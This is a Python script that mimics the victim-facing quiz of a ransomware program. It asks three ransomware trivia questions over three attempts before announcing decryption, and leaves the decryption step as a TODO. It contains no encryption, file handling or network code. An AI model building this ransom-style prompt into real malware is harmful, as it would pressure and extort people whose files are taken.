
# List of question-answer pairs to be prompted to a user
qAndA = ({"What kind of cyber attack is this?": ("ransomware", )},
         {"When was the first recorded case of a ransomware attack?": 1989},
         {"How much was the largest ransomware payment ever made (in millions)?": ("75", "$75")})

# Flag indicating whether the user satisfies the terms of the agreement to get their files decrypted
ready_to_decrypt: bool = False

def askQuestion():
    """A generator function to iterate through all the questions one at time. If a user answers incorrectly,
    user has to restart until they use up all their attempts.
    :return None"""

    numCorrect: int = 0

    # Iterates through each Q-A pair in the list of questions and answers above
    for question_answer_pair in qAndA:
        # Unpacks the key-value pairs into question and answer variables
        for question, answer in question_answer_pair.items():
            # Prints the question to be answered and pauses the program until the user inputs a response
            user_response: str = yield question
            correct: bool

            # Checks if the answer is expected to be an integer or have multiple formats (can be an int or str)
            # and determines whether a user's response correctly answers the question or not
            if isinstance(answer, int):
                yield answer
                correct = (int(user_response) == answer)
            else:
                yield answer
                correct = (user_response.lower() in answer)

            if correct:
                print("Correct!")
                numCorrect += 1
                # Updates the flag to tell the program that the user has met the requirements to have their
                # files decrypted
                if numCorrect == len(qAndA):
                    print("You win! Decrypting your files now...")
                    global ready_to_decrypt
                    ready_to_decrypt = True
                    return
            else:
                print("Incorrect.")
                return


def main():
    num_attempts: int = 1
    attempts_left: int = 3

    # Displays the questions for each attempt until the user either exhausts their attempts or satisfies the
    # conditions for decryption
    while attempts_left != 0 and ready_to_decrypt is False:
        print("**** Attempt", num_attempts, "****")

        # Creates a generator object
        questions = askQuestion()

        # Goes through one question at a time and compares the user's response
        for question in questions:
            user_response = input(question + " ")
            # Only until after the user inputs a response, the program unpauses execution and sends the user's
            # response back to the generator
            questions.send(user_response)

        # TODO: Should execute the script to decrypt the encrypted files
        if ready_to_decrypt is True:
            print("Begin Decryption!")

        num_attempts += 1
        attempts_left -= 1

        if attempts_left == 0:
            print("You ran out of attempts! Good luck decrypting your files!")

main()
